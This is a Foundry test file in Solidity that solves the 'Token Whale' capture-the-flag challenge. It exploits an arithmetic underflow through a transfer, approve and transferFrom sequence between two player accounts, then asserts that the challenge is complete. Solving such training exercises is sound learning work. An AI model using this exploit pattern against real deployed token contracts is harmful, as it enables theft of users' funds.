// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.6;

import "forge-std/Test.sol";
import "../src/2-Token-whale.sol";

contract Challenge2Test is Test {
    TokenWhaleChallenge target;
    address player = vm.addr(1);

    function setUp() public {
        target = new TokenWhaleChallenge(player);
        vm.label(address(target), "Challenge");
        vm.label(player, "Player");
    }

    function testExample() public {
        vm.startPrank(address(player));

        // tu codigo aca

        address player2 = vm.addr(2);
        target.transfer(player2, 501);

        vm.stopPrank();
        vm.prank(player2);
        target.approve(player, 501);
        
        vm.startPrank(address(player));
        target.transferFrom(player2, player2, 501);
        
                
        assertTrue(target.isComplete());
    }
}
